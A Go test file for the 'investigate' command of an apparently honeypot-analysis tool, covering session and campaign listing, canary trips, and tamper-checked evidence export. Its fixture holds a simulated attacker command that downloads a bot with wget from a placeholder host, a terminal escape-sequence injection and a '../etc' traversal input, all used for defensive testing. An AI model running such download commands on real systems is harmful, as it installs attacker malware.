package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/spf13/cobra"

	"github.com/qpot/qpot/internal/canary"
	"github.com/qpot/qpot/internal/config"
	"github.com/qpot/qpot/internal/database"
	"github.com/qpot/qpot/internal/intelligence"
	"github.com/qpot/qpot/internal/investigate"
)

// caseStore is an instance's stored events and sessions, in memory.
type caseStore struct {
	events   []*database.Event
	sessions []*database.TTPSession
}

func (s *caseStore) GetEvents(_ context.Context, f database.EventFilter) ([]*database.Event, error) {
	var out []*database.Event
	for _, e := range s.events {
		if (!f.StartTime.IsZero() && e.Timestamp.Before(f.StartTime)) || (!f.EndTime.IsZero() && e.Timestamp.After(f.EndTime)) {
			continue
		}
		out = append(out, e)
	}
	sort.SliceStable(out, func(i, j int) bool { return out[i].Timestamp.After(out[j].Timestamp) })
	if f.Offset >= len(out) {
		return nil, nil
	}
	if out = out[f.Offset:]; f.Limit > 0 && len(out) > f.Limit {
		out = out[:f.Limit]
	}
	return out, nil
}

func (s *caseStore) GetTTPSessions(context.Context, int) ([]*database.TTPSession, error) {
	return s.sessions, nil
}

// investigateInstance makes instance "lab" exist in an empty home directory,
// with two sources that fetched the same payload and a canary trip by one.
func investigateInstance(t *testing.T) *caseStore {
	t.Helper()
	t.Setenv("HOME", t.TempDir())
	t.Setenv("USERPROFILE", os.Getenv("HOME"))
	path := config.Default("lab").ConfigPath
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("instance_name: lab\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	base := time.Now().UTC().Add(-10 * time.Minute).Truncate(time.Second)
	store := &caseStore{}
	b := intelligence.NewTTPBuilder(30 * time.Minute)
	for i, ip := range []string{"198.51.100.1", "198.51.100.2"} {
		mk := func(ms int, typ, command, payload string) {
			e := &database.Event{Timestamp: base.Add(time.Duration(i)*time.Minute + time.Duration(ms)*time.Millisecond), Honeypot: "cowrie", SourceIP: ip,
				DestPort: 22, EventType: typ, Command: command, Payload: []byte(payload), Classified: true, Metadata: map[string]string{"session": "c" + ip}}
			if typ == "cowrie.session.file_download" {
				e.Metadata["shasum"] = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
			}
			store.events = append(store.events, e)
			b.Update(e)
		}
		mk(0, "cowrie.session.connect", "", "")
		mk(10, "cowrie.command.input", "wget http://203.0.113.50/bot \x1b[2J", "")
		mk(20, "cowrie.session.file_download", "", "http://203.0.113.50/bot")
	}
	store.sessions = b.GetActiveSessions()
	real := openInvestigation
	t.Cleanup(func() { openInvestigation = real })
	openInvestigation = func(_ context.Context, name string) (investigate.Reader, investigate.Options, func(), error) {
		if name != "lab" {
			return nil, investigate.Options{}, nil, errors.New("failed to connect to the database of instance (is it running?)")
		}
		trips := []*canary.Trip{{ID: "trip_1", Kind: canary.Kind("web"), Name: "wiki", Channel: "http", Time: base.Add(15 * time.Millisecond), SourceIP: "198.51.100.1"}}
		return store, investigate.Options{Trips: trips}, func() {}, nil
	}
	return store
}

func executeInvestigate(t *testing.T, args ...string) (string, error) {
	t.Helper()
	root := &cobra.Command{Use: "qpot", SilenceUsage: true, SilenceErrors: true, PersistentPreRunE: checkInstanceFlag}
	root.AddCommand(newInvestigateCommand())
	var out bytes.Buffer
	root.SetOut(&out)
	root.SetErr(&out)
	root.SetArgs(append([]string{"investigate"}, args...))
	err := root.Execute()
	return out.String(), err
}

func TestInvestigateCommand(t *testing.T) {
	store := investigateInstance(t)
	first := store.sessions[0]
	for _, s := range store.sessions {
		if s.SourceIPs[0] == "198.51.100.1" {
			first = s
		}
	}

	out, err := executeInvestigate(t, "list", "-i", "lab")
	if err != nil || !strings.Contains(out, first.SessionID) || !strings.Contains(out, first.CampaignFingerprint+"  2 sessions") {
		t.Fatalf("list: %v\n%s", err, out)
	}
	out, err = executeInvestigate(t, "list", "-i", "lab", "--json")
	var listing investigate.Listing
	if err != nil || json.Unmarshal([]byte(out), &listing) != nil || len(listing.Sessions) != 2 || len(listing.Campaigns) != 1 {
		t.Fatalf("list --json: %v\n%s", err, out)
	}

	out, err = executeInvestigate(t, "session", first.SessionID, "-i", "lab")
	if err != nil {
		t.Fatalf("session: %v\n%s", err, out)
	}
	for _, want := range []string{"Session " + first.SessionID, "Instance    lab", "connection → command → transfer → canary", `wget http://203.0.113.50/bot \x1b[2J`,
		"follows the command in [", `Canary "wiki" (web) tripped over http`, "same campaign", "output-not-captured"} {
		if !strings.Contains(out, want) {
			t.Errorf("session text lacks %q:\n%s", want, out)
		}
	}
	if strings.ContainsRune(out, 0x1b) {
		t.Fatal("an escape sequence reached the terminal")
	}

	// Four events shared by two sessions: each stops before its download, so
	// the host in the command is the one link read.
	out, err = executeInvestigate(t, "campaign", first.CampaignFingerprint, "-i", "lab", "--json", "--max-events", "4")
	var c investigate.Case
	if err != nil || json.Unmarshal([]byte(out), &c) != nil || c.Kind != "campaign" || len(c.Sessions) != 2 || len(c.Links) != 1 || len(c.Records) != 4 || c.Instance != "lab" {
		t.Fatalf("campaign --json: %v, %d sessions, %d links, %d records", err, len(c.Sessions), len(c.Links), len(c.Records))
	}

	// Export, then verify: with no instance at all.
	bundle := filepath.Join(t.TempDir(), "case.zip")
	out, err = executeInvestigate(t, "export", "campaign", first.CampaignFingerprint, "-i", "lab", "--out", bundle)
	if err != nil || !strings.Contains(out, "6 records") || !strings.Contains(out, "SHA-256 ") {
		t.Fatalf("export: %v\n%s", err, out)
	}
	if info, err := os.Stat(bundle); err != nil || info.Size() == 0 {
		t.Fatalf("bundle: %v", err)
	}
	if out, err = executeInvestigate(t, "export", "campaign", first.CampaignFingerprint, "-i", "lab", "--out", bundle); err == nil || !strings.Contains(err.Error(), "exists already") {
		t.Fatalf("a bundle was written over: %v\n%s", err, out)
	}
	out, err = executeInvestigate(t, "verify", bundle)
	if err != nil || !strings.Contains(out, "The bundle is whole.") || !strings.Contains(out, "6 records, 6 cited") {
		t.Fatalf("verify: %v\n%s", err, out)
	}
	data, err := os.ReadFile(bundle)
	if err != nil {
		t.Fatal(err)
	}
	// One byte of the archive's stored data changed: it no longer checks out.
	at := bytes.Index(data, []byte("records.jsonl")) + len("records.jsonl") + 20
	data[at] ^= 0x01
	broken := filepath.Join(t.TempDir(), "broken.zip")
	if err := os.WriteFile(broken, data, 0o600); err != nil {
		t.Fatal(err)
	}
	if out, err = executeInvestigate(t, "verify", broken); err == nil {
		t.Fatalf("a changed bundle checked out:\n%s", out)
	}

	for _, tc := range []struct {
		args []string
		want string
	}{
		{[]string{"session", "nosuch", "-i", "lab"}, "has no session nosuch"},
		{[]string{"session", "../etc", "-i", "lab"}, "is not a session ID"},
		{[]string{"campaign", first.CampaignFingerprint, "-i", "lab", "--max-events", "0"}, "--max-events must be"},
		{[]string{"list", "-i", "lab", "--limit", "9999"}, "--limit must be"},
		{[]string{"export", "host", "x", "-i", "lab", "--out", "x.zip"}, "export a session or a campaign"},
		{[]string{"export", "session", first.SessionID, "-i", "lab"}, "--out"},
		{[]string{"session", first.SessionID, "-i", "missing"}, `instance "missing" does not exist`},
		{[]string{"verify", filepath.Join(t.TempDir(), "none.zip")}, "none.zip"},
	} {
		if out, err := executeInvestigate(t, tc.args...); err == nil || !strings.Contains(err.Error(), tc.want) {
			t.Errorf("%v: %v\n%s", tc.args, err, out)
		}
	}
}
